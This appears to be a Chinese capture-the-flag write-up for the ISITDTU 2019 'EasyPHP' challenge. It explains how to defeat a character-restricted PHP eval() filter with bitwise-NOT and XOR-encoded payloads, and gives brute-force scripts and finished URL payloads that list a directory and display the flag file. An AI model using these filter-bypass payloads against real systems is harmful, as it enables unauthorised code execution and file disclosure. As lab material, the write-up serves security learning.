---
title: '[ISITDTU 2019]EasyPHP'
date: 2024-07-25 19:01:11
tags: 
      - 题解
      - rce
categories: 刷题笔记
---

## [ISITDTU 2019]EasyPHP(无字母字符rce进阶)

我们进行代码审计

```
<?php
highlight_file(__FILE__);

$_ = @$_GET['_'];
if ( preg_match('/[\x00- 0-9\'"`$&.,|[{_defgops\x7F]+/i', $_) )
    die('rosé will not do it');

if ( strlen(count_chars(strtolower($_), 0x3)) > 0xd )
    die('you are so close, omg');

eval($_);
?>

```

第一个if的正则匹配我们可以放到https://regex101.com/这个网站去分析

具体来说就是

<!--more-->

```
\x00- 0-9                       匹配\x00到空格(\x20)，0-9的数字
'"`$&.,|[{_defgops              匹配这些字符
\x7F                            匹配DEL(\x7F)字符
```

排除后我们能使用的字符为

```
!#%()*+-/:;<=>?@ABCHIJKLMNQRTUVWXYZ\]^abchijklmnqrtuvwxyz}~
```

第二个if限制了提交字符的种类

count_char(),当mode=3: 会返回包含所有用过的不同字符的字符串

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/221ef6c280b9d6f9197addbdc33d0115.png)

所以字符串的字符种类不能超过13种

通过大佬博客上的脚本，我们来看那些函数可以被使用

```
$array=get_defined_functions();//返回所有内置定义函数
foreach($array['internal'] as $arr){
    if ( preg_match('/[\x00- 0-9\'"\`$&.,|[{_defgops\x7F]+/i', $arr) ) continue;
    if ( strlen(count_chars(strtolower($arr), 0x3)) > 0xd ) continue;
    print($arr.'<br/>');
}

//运行结果
bcmul
rtrim
trim
ltrim
chr
link
unlink
tan
atan
atanh
tanh
intval
mail
min
max
virtual

```

并没有发现我们需要的函数，由于没有过滤~和^，我们考虑使用取反绕过

我们先异或phpinfo()尝试

其实~P=0x8f^0xFF

```
<?php
$a="phpinfo";
echo urlencode(~$a);

//%8F%97%8F%96%91%99%90
```

![image-20240804213355256](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408042134424.png)

成功绕过

我们查看disable_functions，发现所有的命令执行的函数都被禁了。我们需要找到flag文件，我们可以使用scandir()或者glob()列目录，但它返回一个数组，我们还需要一个print_r或var_dump

```
print_r(scandir('.'));
```

我们进行暴力异或

```
final_string="print_r(scandir('.'));"
allowed="!#%()*+-/:;<=>?@ABCHIJKLMNQRTUVWXYZ\]^abchijklmnqrtuvwxyz}~"
for a in final_string:    
    for i in allowed:
        for p in allowed:
            if ord(i)^ord(p)==ord(a):
                print("i=%s p=%s a=%s"%(hex(ord(i)),hex( ord(p)),hex(ord(a)))))

```

整理一下就变成了

```
print_r(scandir('.'));==((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));

```

但当我们运行时，第二个if语句报错了，原因是我们一共用了16个不同字符，下一步是缩减字符数

```
result2 = [0x8b, 0x9b, 0xa0, 0x9c, 0x8f, 0x91, 0x9e, 0xd1, 0x96, 0x8d, 0x8c]  # Original chars,11 total
result = [0x9b, 0xa0, 0x9c, 0x8f, 0x9e, 0xd1, 0x96, 0x8c]  # to be deleted
temp = []
for d in result2:
    for a in result:
        for b in result:
            for c in result:
                if (a ^ b ^ c == d):
                    if a == b == c == d:
                        continue
                    else:
                        print("a=0x%x,b=0x%x,c=0x%x,d=0x%x" % (a, b, c, d))
                        if d not in temp:
                            temp.append(d)
print(len(temp), temp)

```

除了必要的()^;以外，我们最多剩余9个字符的空间，逐步删除result里的值，当结果仍能保持11个，就意味着我们可以继续删除了

```
print_r(scandir(.));=((%9b%9c%9b%9b%9b%9b%9c)^(%9b%8f%9b%9c%9c%9b%8f)^(%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));

```

![image-20240804220158064](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408042201143.png)

发现flag所在目录

我们需要进行读取，我们使用show_source或者readfile,flag文件在数组的最后面，我们使用end()获取文件名

```
show_source(end(scandir(.)));
```

```
result2 = [160, 136, 138, 140, 141, 144, 145, 209, 150, 151, 154, 155, 156, 158]  # Original chars,14 total
result = [160, 136, 141, 209, 151, 154, 155, 156]
temp = []
for d in result2:
    for a in result:
        for b in result:
            for c in result:
                if (a ^ b ^ c == d):
                    if (a == b == c == d) or (a==b) or (b==c) or (c==d) or(a==c):
                        continue
                    else:
                        print("a=0x%x,b=0x%x,c=0x%x,d=0x%x" % (a, b, c, d))
                        if d not in temp:
                            temp.append(d)
print(len(temp), temp)

```

```
show_source(end(scandir(.)));=((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));

```

获得flag

![image-20240804220429051](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408042204204.png)
